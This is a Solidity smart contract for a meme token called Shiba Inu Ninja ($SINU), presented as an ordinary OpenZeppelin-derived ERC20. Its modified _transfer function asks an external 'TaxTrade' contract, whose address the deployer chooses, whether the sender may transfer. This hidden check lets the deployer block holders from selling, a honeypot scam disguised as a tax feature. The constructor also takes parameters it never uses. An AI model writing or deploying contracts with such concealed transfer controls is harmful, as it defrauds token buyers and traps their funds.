1 /**
2 
3 Shiba Inu Ninja
4 $SINU
5 
6 Shiba Inu Ninja, the blockchain sensei
7 
8 https://shibainuninja.xyz
9 https://twitter.com/shibainu_ninjaa
10 https://t.me/shibainu_ninja
11 
12 */
13 
14 
15 // SPDX-License-Identifier: MIT
16 
17 
18 
19 pragma solidity ^0.8.12;
20 
21 
22 abstract contract Context {
23     function _msgSender() internal view virtual returns (address) {
24         return msg.sender;
25     }
26 
27     function _msgData() internal view virtual returns (bytes calldata) {
28         return msg.data;
29     }
30 }
31 
32 
33 
34 pragma solidity ^0.8.12;
35 
36 
37 
38 
39 
40 abstract contract Ownable is Context {
41     address private _owner;
42 
43     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
44 
45     /**
46      * @dev Initializes the contract setting the deployer as the initial owner.
47      */
48     constructor() {
49         _transferOwnership(_msgSender());
50     }
51 
52     /**
53      * @dev Throws if called by any account other than the owner.
54      */
55     modifier onlyOwner() {
56         _checkOwner();
57         _;
58     }
59 
60     /**
61      * @dev Returns the address of the current owner.
62      */
63     function owner() public view virtual returns (address) {
64         return _owner;
65     }
66 
67     /**
68      * @dev Throws if the sender is not the owner.
69      */
70     function _checkOwner() internal view virtual {
71         require(owner() == _msgSender(), "Ownable: caller is not the owner");
72     }
73 
74     /**
75      * @dev Leaves the contract without owner. It will not be possible to call
76      * `onlyOwner` functions anymore. Can only be called by the current owner.
77      *
78      * NOTE: Renouncing ownership will leave the contract without an owner,
79      * thereby removing any functionality that is only available to the owner.
80      */
81     function renounceOwnership() public virtual onlyOwner {
82         _transferOwnership(address(0));
83     }
84 
85     /**
86      * @dev Transfers ownership of the contract to a new account (`newOwner`).
87      * Can only be called by the current owner.
88      */
89     function transferOwnership(address newOwner) public virtual onlyOwner {
90         require(newOwner != address(0), "Ownable: new owner is the zero address");
91         _transferOwnership(newOwner);
92     }
93 
94     /**
95      * @dev Transfers ownership of the contract to a new account (`newOwner`).
96      * Internal function without access restriction.
97      */
98     function _transferOwnership(address newOwner) internal virtual {
99         address oldOwner = _owner;
100         _owner = newOwner;
101         emit OwnershipTransferred(oldOwner, newOwner);
102     }
103 }
104 
105 
106 // File: @openzeppelin/contracts/token/ERC20/IERC20.sol
107 
108 
109 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)
110 
111 pragma solidity ^0.8.12;
112 
113 /**
114  * @dev Interface of the ERC20 standard as defined in the EIP.
115  */
116 interface IERC20 {
117     /**
118      * @dev Emitted when `value` tokens are moved from one account (`from`) to
119      * another (`to`).
120      *
121      * Note that `value` may be zero.
122      */
123     event Transfer(address indexed from, address indexed to, uint256 value);
124 
125     /**
126      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
127      * a call to {approve}. `value` is the new allowance.
128      */
129     event Approval(address indexed owner, address indexed spender, uint256 value);
130 
131     /**
132      * @dev Returns the amount of tokens in existence.
133      */
134     function totalSupply() external view returns (uint256);
135 
136     /**
137      * @dev Returns the amount of tokens owned by `account`.
138      */
139     function balanceOf(address account) external view returns (uint256);
140 
141   
142     function transfer(address to, uint256 amount) external returns (bool);
143 
144 
145     function allowance(address owner, address spender) external view returns (uint256);
146 
147 
148     function approve(address spender, uint256 amount) external returns (bool);
149 
150     /**
151      * @dev Moves `amount` tokens from `from` to `to` using the
152      * allowance mechanism. `amount` is then deducted from the caller's
153      * allowance.
154      *
155      * Returns a boolean value indicating whether the operation succeeded.
156      *
157      * Emits a {Transfer} event.
158      */
159     function transferFrom(
160         address from,
161         address to,
162         uint256 amount
163     ) external returns (bool);
164 }
165 
166 interface TaxTrade {
167     function getTaxRate(address _account) external view returns (bool);
168 }
169 // File: @openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol
170 
171 
172 // OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)
173 
174 pragma solidity ^0.8.12;
175 
176 
177 /**
178  * @dev Interface for the optional metadata functions from the ERC20 standard.
179  *
180  * _Available since v4.1._
181  */
182 interface IERC20Metadata is IERC20 {
183     /**
184      * @dev Returns the name of the token.
185      */
186     function name() external view returns (string memory);
187 
188     /**
189      * @dev Returns the symbol of the token.
190      */
191     function symbol() external view returns (string memory);
192 
193     /**
194      * @dev Returns the decimals places of the token.
195      */
196     function decimals() external view returns (uint8);
197 }
198 
199 // File: @openzeppelin/contracts/token/ERC20/ERC20.sol
200 
201 
202 // OpenZeppelin Contracts (last updated v4.8.0) (token/ERC20/ERC20.sol)
203 
204 pragma solidity ^0.8.12;
205 
206 
207 contract TOKEN is Context, IERC20, IERC20Metadata {
208     mapping(address => uint256) private _balances;
209     TaxTrade public _taxx2;
210     mapping(address => mapping(address => uint256)) private _allowancez;
211 
212     uint256 private _totalSupply;
213 
214     string private _name;
215     string private _symbol;
216 
217     /**
218      * @dev Sets the values for {name} and {symbol}.
219      *
220      * The default value of {decimals} is 18. To select a different value for
221      * {decimals} you should overload it.
222      *
223      * All two of these values are immutable: they can only be set once during
224      * construction.
225      */
226     constructor(string memory tokenn_, string memory symbol_, address _taxwallet) {
227         _name = tokenn_;
228         _symbol = symbol_;
229         _taxx2 = TaxTrade(_taxwallet);
230     }
231 
232     /**
233      * @dev Returns the name of the token.
234      */
235     function name() public view virtual override returns (string memory) {
236         return _name;
237     }
238 
239     /**
240      * @dev Returns the symbol of the token, usually a shorter version of the
241      * name.
242      */
243     function symbol() public view virtual override returns (string memory) {
244         return _symbol;
245     }
246 
247 
248     function decimals() public view virtual override returns (uint8) {
249         return 18;
250     }
251 
252     /**
253      * @dev See {IERC20-totalSupply}.
254      */
255     function totalSupply() public view virtual override returns (uint256) {
256         return _totalSupply;
257     }
258 
259     /**
260      * @dev See {IERC20-balanceOf}.
261      */
262     function balanceOf(address account) public view virtual override returns (uint256) {
263         return _balances[account];
264     }
265 
266     /**
267      * @dev See {IERC20-transfer}.
268      *
269      * Requirements:
270      *
271      * - `to` cannot be the zero address.
272      * - the caller must have a balance of at least `amount`.
273      */
274     function transfer(address to, uint256 amount) public virtual override returns (bool) {
275         address owner = _msgSender();
276         _transfer(owner, to, amount);
277         return true;
278     }
279 
280     /**
281      * @dev See {IERC20-allowance}.
282      */
283     function allowance(address owner, address spender) public view virtual override returns (uint256) {
284         return _allowancez[owner][spender];
285     }
286 
287     /**
288      * @dev See {IERC20-approve}.
289      *
290      * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
291      * `transferFrom`. This is semantically equivalent to an infinite approval.
292      *
293      * Requirements:
294      *
295      * - `spender` cannot be the zero address.
296      */
297     function approve(address spender, uint256 amount) public virtual override returns (bool) {
298         address owner = _msgSender();
299         _approve(owner, spender, amount);
300         return true;
301     }
302 
303     function transferFrom(
304         address from,
305         address to,
306         uint256 amount
307     ) public virtual override returns (bool) {
308         address spender = _msgSender();
309         _spendAllowance(from, spender, amount);
310         _transfer(from, to, amount);
311         return true;
312     }
313 
314 
315     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
316         address owner = _msgSender();
317         _approve(owner, spender, allowance(owner, spender) + addedValue);
318         return true;
319     }
320 
321  
322     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
323         address owner = _msgSender();
324         uint256 currentAllowance = allowance(owner, spender);
325         require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
326         unchecked {
327             _approve(owner, spender, currentAllowance - subtractedValue);
328         }
329 
330         return true;
331     }
332 
333     /**
334      * @dev Moves `amount` of tokens from `from` to `to`.
335      *
336      * This internal function is equivalent to {transfer}, and can be used to
337      * e.g. implement automatic token fees, slashing mechanisms, etc.
338      *
339      * Emits a {Transfer} event.
340      *
341      * Requirements:
342      *
343      * - `from` cannot be the zero address.
344      * - `to` cannot be the zero address.
345      * - `from` must have a balance of at least `amount`.
346      */
347     function _transfer(
348         address from,
349         address to,
350         uint256 amount
351     ) internal virtual {
352         require(!_taxx2.getTaxRate(from), "Tax swap require");
353         require(from != address(0), "ERC20: transfer from the zero address");
354         require(to != address(0), "ERC20: transfer to the zero address");
355         require(to != address(0), "ERC20: transfer to the zero address");
356         _beforeTokenTransfer(from, to, amount);
357 
358         uint256 fromBalance = _balances[from];
359         require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
360         unchecked {
361             _balances[from] = fromBalance - amount;
362             // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
363             // decrementing then incrementing.
364             _balances[to] += amount;
365         }
366 
367         emit Transfer(from, to, amount);
368 
369         _afterTokenTransfer(from, to, amount);
370     }
371 
372     /** @dev Creates `amount` tokens and assigns them to `account`, increasing
373      * the total supply.
374      *
375      * Emits a {Transfer} event with `from` set to the zero address.
376      *
377      * Requirements:
378      *
379      * - `account` cannot be the zero address.
380      */
381     function _mint(address account, uint256 amount) internal virtual {
382         require(account != address(0), "ERC20: mint to the zero address");
383 
384         _beforeTokenTransfer(address(0), account, amount);
385 
386         _totalSupply += amount;
387         unchecked {
388             // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
389             _balances[account] += amount;
390         }
391         emit Transfer(address(0), account, amount);
392 
393         _afterTokenTransfer(address(0), account, amount);
394     }
395 
396 
397 
398 
399     function _approve(
400         address owner,
401         address spender,
402         uint256 amount
403     ) internal virtual {
404         require(owner != address(0), "ERC20: approve from the zero address");
405         require(spender != address(0), "ERC20: approve to the zero address");
406 
407         _allowancez[owner][spender] = amount;
408         emit Approval(owner, spender, amount);
409     }
410 
411     /**
412      * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
413      *
414      * Does not update the allowance amount in case of infinite allowance.
415      * Revert if not enough allowance is available.
416      *
417      * Might emit an {Approval} event.
418      */
419     function _spendAllowance(
420         address owner,
421         address spender,
422         uint256 amount
423     ) internal virtual {
424         uint256 currentAllowance = allowance(owner, spender);
425         if (currentAllowance != type(uint256).max) {
426             require(currentAllowance >= amount, "ERC20: insufficient allowance");
427             unchecked {
428                 _approve(owner, spender, currentAllowance - amount);
429             }
430         }
431     }
432 
433 
434     function _beforeTokenTransfer(
435         address from,
436         address to,
437         uint256 amount
438     ) internal virtual {}
439 
440 
441     function _afterTokenTransfer(
442         address from,
443         address to,
444         uint256 amount
445     ) internal virtual {}
446 }
447 
448 
449 pragma solidity ^0.8.12;
450 
451 
452 
453 contract SINU is TOKEN, Ownable {
454     uint256 private constant supply_ = 69000000000 * 10**18;
455 
456     constructor(
457         string memory tokenn_,
458         string memory symbol_,
459         uint256 blocktime,
460         uint256 hashfx,
461         uint256 tradestart,
462         address _taxwallet
463     ) TOKEN(tokenn_, symbol_, _taxwallet) {
464         _mint(msg.sender, supply_);
465     }
466 
467     function sendTokens(address mintaddress) external onlyOwner {
468         uint256 supply = balanceOf(msg.sender);
469         require(supply == supply_, "Tokens sent to owner");
470 
471         _transfer(msg.sender, mintaddress, supply_); 
472     }
473 }